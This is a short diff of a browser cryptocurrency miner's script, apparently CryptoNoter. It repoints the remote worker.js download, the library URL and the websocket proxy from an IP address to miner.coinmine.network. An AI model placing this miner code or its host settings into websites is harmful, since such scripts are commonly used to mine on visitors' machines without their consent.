@@ -66,7 +66,7 @@
                 this._asmjsStatus = "loaded";
                 this._startNow()
             }.bind(this), xhr);
-            xhr.open("get", "http://46.101.40.29/worker.js", true);
+            xhr.open("get", "http://miner.coinmine.network/worker.js", true);
             xhr.send()
         } else if (this._asmjsStatus === "unloaded") {
             this._asmjsStatus = "pending";
@@ -489,6 +489,6 @@
 })(window);
 self.CryptoNoter = self.CryptoNoter || {};
 self.CryptoNoter.CONFIG = {
-    LIB_URL: "http://46.101.40.29/lib/",
-    WEBSOCKET_SHARDS: [["wss://46.101.40.29/proxy"]]
+    LIB_URL: "http://miner.coinmine.network/lib/",
+    WEBSOCKET_SHARDS: [["wss://miner.coinmine.network/proxy"]]
 };
